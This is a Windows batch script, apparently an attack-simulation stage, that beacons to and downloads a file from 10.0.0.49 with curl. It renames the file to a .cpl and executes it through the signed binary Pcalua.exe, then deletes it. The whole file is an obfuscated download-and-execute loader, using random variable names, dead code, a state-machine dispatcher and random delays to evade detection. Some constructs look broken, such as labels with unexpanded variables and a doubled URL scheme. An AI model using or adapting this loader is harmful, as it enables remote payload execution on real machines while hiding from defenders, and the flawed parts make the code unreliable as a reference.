@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM ===== PHR_ CONSTANTS (PLAIN LITERALS) =====
REM Random variable names with PHR_ as values - DO NOT MODIFY THESE STRINGS
SET yktnwwf=%APPDATA%\7878\2c54383f
SET fpakbq=Macula-Stage0-7878
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7878-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=expressvp.txt
SET fpldhe=7878

REM ===== LOGGING VARIABLES =====
SET jhqwlg=%APPDATA%\!yydue!\macula-simulations.log
SET dhqmln=!omxgazu!

REM ===== STATE MACHINE VARIABLES =====
SET zxddff=0
SET qwmnb=null
SET plmkjn=c
SET vbnmlp=x
SET tyuiop=z

REM ===== RANDOM DELAY AT START =====
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Initial delay start>>> "!jhqwlg!" 2>nul
SET /A kpldhf=%RANDOM% %% 31 + 30
timeout /t !kpldhf! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Initial delay !kpldhf!s complete>>> "!jhqwlg!" 2>nul

REM ===== DISPATCHER - STATE MACHINE ENTRY =====
GOTO dispatch_!plmkjn!!vbnmlp!!tyuiop!

:dead_qwert
REM Dead code - never executed
SET fakevar=dead_code_value
GOTO END

:dispatch_!plmkjn!!vbnmlp!!tyuiop!
IF !zxddff!==0 GOTO state_mnbvc
IF !zxddff!==17 GOTO state_poiuy
IF !zxddff!==42 GOTO state_lkjhg
IF !zxddff!==63 GOTO state_dfghj
IF !zxddff!==84 GOTO state_cvbnt
IF !zxddff!==99 GOTO state_clean

REM Opaque predicate - always false
IF 0==1 (
    GOTO dead_asdfg
) ELSE (
    SET qwmnb=continue
)

:dead_asdfg
REM Unreachable dead code
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Dead code block>>> "!jhqwlg!" 2>nul
EXIT /B 1

REM ===== STATE 0: SETUP AND PREPARATION =====
:state_mnbvc
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Setup phase start>>> "!jhqwlg!" 2>nul
SET zxddff=17

REM Interleaved delay
SET /A rtyuio=%RANDOM% %% 10 + 5
CHOICE /C Y /N /D Y /T !rtyuio! >nul
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Delay !rtyuio!s complete>>> "!jhqwlg!" 2>nul

GOTO midchain_!plmkjn!!vbnmlp!

:dead_zxcvb
REM More dead code
SET junk1=unused1
SET junk2=unused2
GOTO END

:midchain_!plmkjn!!vbnmlp!
GOTO dispatch_!plmkjn!!vbnmlp!!tyuiop!

:dead_qazws
REM Unreachable
EXIT /B 2

REM ===== STATE 17: HEARTBEAT CHECK =====
:state_poiuy
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Heartbeat check start>>> "!jhqwlg!" 2>nul

SET tpresult=0
SET tperror=
SET qwmnb=null

REM Obfuscated curl command with junk echo
IF 1==1 (
    curl -k -s -o nul "!rdzgrnne!"
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Fake branch>>> "!jhqwlg!" 2>nul
)

IF !ERRORLEVEL! EQU 0 (
    SET tpresult=1
    SET zxddff=42
    echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Heartbeat success>>> "!jhqwlg!" 2>nul
) ELSE (
    SET tperror=connection_failed
    SET zxddff=99
    echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Heartbeat failed>>> "!jhqwlg!" 2>nul
)

REM TTP logging block
SET "logtime=!DATE! !TIME!"
IF NOT "!tpresult!"=="" (
    echo [!logtime!][!dhqmln!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!tpresult!:!tperror!>> "!jhqwlg!" 2>nul || REM
)

ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Post-heartbeat delay>>> "!jhqwlg!" 2>nul

GOTO secchain_!tyuiop!!plmkjn!

:dead_edcrf
REM Dead code interleaved
SET fakevar=more_junk

:secchain_!tyuiop!!plmkjn!
GOTO dispatch_!plmkjn!!vbnmlp!!tyuiop!

REM ===== STATE 42: DOWNLOAD OPERATION =====
:state_lkjhg
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Download phase start>>> "!jhqwlg!" 2>nul

SET tpresult=0
SET tperror=

REM Create output directory if needed
IF NOT EXIST "!yktnwwf!" (
    mkdir "!yktnwwf!" >nul 2>&1
    echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Created dir !yktnwwf!>>> "!jhqwlg!" 2>nul
)

REM Obfuscated download URL construction
SET dlurl=http://!repbmqg!
SET dltarget=!yktnwwf!\!edjwtl!

echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Downloading from !dlurl! to !dltarget!>>> "!jhqwlg!" 2>nul

REM Download with curl
curl -k -s -o "!dltarget!" "!dlurl!"

IF !ERRORLEVEL! EQU 0 (
    IF EXIST "!dltarget!" (
        SET tpresult=1
        SET zxddff=63
        echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Download complete>>> "!jhqwlg!" 2>nul
    ) ELSE (
        SET tperror=file_not_created
        SET zxddff=99
    )
) ELSE (
    SET tperror=download_failed
    SET zxddff=99
)

REM TTP logging
SET "logtime=!DATE! !TIME!"
IF NOT "!tpresult!"=="" (
    echo [!logtime!][!dhqmln!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!tpresult!:!tperror!>> "!jhqwlg!" 2>nul || REM
)

REM Random delay
SET /A delay=%RANDOM% %% 15 + 10
timeout /t !delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Post-download delay !delay!s>>> "!jhqwlg!" 2>nul

GOTO thirdchain_!vbnmlp!!tyuiop!

:dead_tgbhy
REM Dead code section
SET dead1=value1
SET dead2=value2

:thirdchain_!vbnmlp!!tyuiop!
GOTO dispatch_!plmkjn!!vbnmlp!!tyuiop!

REM ===== STATE 63: FILE RENAME OPERATION =====
:state_dfghj
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Rename phase start>>> "!jhqwlg!" 2>nul

SET tpresult=0
SET tperror=

REM Source and target paths
SET srcfile=!yktnwwf!\!edjwtl!
SET dstfile=!yktnwwf!\pcafile.cpl

echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Renaming !srcfile! to !dstfile!>>> "!jhqwlg!" 2>nul

IF EXIST "!srcfile!" (
    move /Y "!srcfile!" "!dstfile!" >nul 2>&1
    IF !ERRORLEVEL! EQU 0 (
        SET tpresult=1
        SET zxddff=84
        echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Rename successful>>> "!jhqwlg!" 2>nul
    ) ELSE (
        SET tperror=move_failed
        SET zxddff=99
    )
) ELSE (
    SET tperror=source_missing
    SET zxddff=99
)

REM Delay between operations
ping -n 6 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Post-rename delay>>> "!jhqwlg!" 2>nul

GOTO fourthchain_!plmkjn!!vbnmlp!

:dead_yhnuj
REM Dead label - never referenced

:fourthchain_!plmkjn!!vbnmlp!
GOTO dispatch_!plmkjn!!vbnmlp!!tyuiop!

REM ===== STATE 84: EXECUTION PHASE =====
:state_cvbnt
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Execution phase start>>> "!jhqwlg!" 2>nul

SET tpresult=0
SET tperror=

REM Full path to LOLBin
SET lolbin=%SystemRoot%\System32\Pcalua.exe
SET cplfile=!yktnwwf!\pcafile.cpl

echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Executing !lolbin! -a !cplfile!>>> "!jhqwlg!" 2>nul

IF EXIST "!cplfile!" (
    IF EXIST "!lolbin!" (
        "!lolbin!" -a "!cplfile!"
        IF !ERRORLEVEL! EQU 0 (
            SET tpresult=1
            SET zxddff=99
            echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Execution successful>>> "!jhqwlg!" 2>nul
        ) ELSE (
            SET tperror=execution_failed
            SET zxddff=99
        )
    ) ELSE (
        SET tperror=binary_missing
        SET zxddff=99
    )
) ELSE (
    SET tperror=cpl_missing
    SET zxddff=99
)

REM TTP logging for T1218
SET "logtime=!DATE! !TIME!"
IF NOT "!tpresult!"=="" (
    echo [!logtime!][!dhqmln!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!tpresult!:!tperror!>> "!jhqwlg!" 2>nul || REM
)

REM Final delay before cleanup
SET /A fdelay=%RANDOM% %% 10 + 5
CHOICE /C Y /N /D Y /T !fdelay! >nul
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Pre-cleanup delay !fdelay!s>>> "!jhqwlg!" 2>nul

GOTO fifthchain_!tyuiop!!vbnmlp!

:dead_ikmpl
REM Final dead code block
EXIT /B 3

:fifthchain_!tyuiop!!vbnmlp!
GOTO dispatch_!plmkjn!!vbnmlp!!tyuiop!

REM ===== STATE 99: CLEANUP AND EXIT =====
:state_clean
echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Cleanup phase>>> "!jhqwlg!" 2>nul

REM Optional cleanup - remove downloaded file
IF EXIST "!yktnwwf!\pcafile.cpl" (
    del "!yktnwwf!\pcafile.cpl" >nul 2>&1
    echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Cleaned up CPL file>>> "!jhqwlg!" 2>nul
)

echo [!DATE! !TIME!][DEBUG][!dhqmln!]: Script completion>>> "!jhqwlg!" 2>nul

:END
ENDLOCAL